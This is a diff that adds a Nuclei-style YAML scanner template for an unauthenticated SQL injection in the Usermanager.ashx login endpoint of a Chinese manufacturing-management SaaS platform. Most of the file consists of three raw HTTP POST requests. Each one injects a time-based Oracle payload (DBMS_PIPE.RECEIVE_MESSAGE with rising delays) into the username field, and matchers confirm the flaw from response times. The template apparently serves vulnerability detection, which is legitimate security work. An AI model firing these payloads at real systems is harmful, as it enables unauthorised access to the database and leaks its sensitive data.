@@ -1,0 +1,48 @@
+id: tianzhiyun-Usermanager-sqli
+info:
+  name: 天智云智造管理平台Usermanager.ashx存在SQL注入漏洞
+  author: wangzong
+  severity: high
+  description: 天智云智造管理平台又称天智云SAAS平台，是专业为中小型生产企业提供智能化生产管理的标准MES软件。该系统向中小型生产企业提供一站式平台服务，串联销售采购/生产/质量/仓库等各个部门。其Usermanager.ashx 接口处存在SQL注入漏洞，未经授权攻击者可通过该漏洞获取数据库敏感信息，进一步利用可获取服务器权限，导致网站处于极度不安全状态。
+  reference:
+    - https://github.com/wy876/POC/blob/main/%E5%A4%A9%E6%99%BA%E4%BA%91%E6%99%BA%E9%80%A0%E7%AE%A1%E7%90%86%E5%B9%B3%E5%8F%B0Usermanager.ashx%E5%AD%98%E5%9C%A8SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E.md
+  tags: tags
+http:
+  - raw:
+      - |-
+        POST /Ashx/Usermanager.ashx HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent:Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36
+        X-Requested-With: XMLHttpRequest
+        Content-Type: application/x-www-form-urlencoded
+        Content-Length: 88
+
+        type=LOGIN&username=1')+AND+8645%3dDBMS_PIPE.RECEIVE_MESSAGE(CHR(110)
+        ,3)--&pwd=1&vendor=
+      - |-
+        POST /Ashx/Usermanager.ashx HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent:Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36
+        X-Requested-With: XMLHttpRequest
+        Content-Type: application/x-www-form-urlencoded
+        Content-Length: 88
+
+        type=LOGIN&username=1')+AND+8645%3dDBMS_PIPE.RECEIVE_MESSAGE(CHR(110)
+        ,6)--&pwd=1&vendor=
+      - |-
+        POST /Ashx/Usermanager.ashx HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent:Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36
+        X-Requested-With: XMLHttpRequest
+        Content-Type: application/x-www-form-urlencoded
+        Content-Length: 88
+
+        type=LOGIN&username=1')+AND+8645%3dDBMS_PIPE.RECEIVE_MESSAGE(CHR(110)
+        ,9)--&pwd=1&vendor=
+    matchers:
+      - type: dsl
+        condition: and
+        dsl:
+          - "duration_1>=3  && duration_1<=6"
+          - "duration_2>=6  && duration_2<=9"
+          - "duration_3>=9  && duration_3<=12"
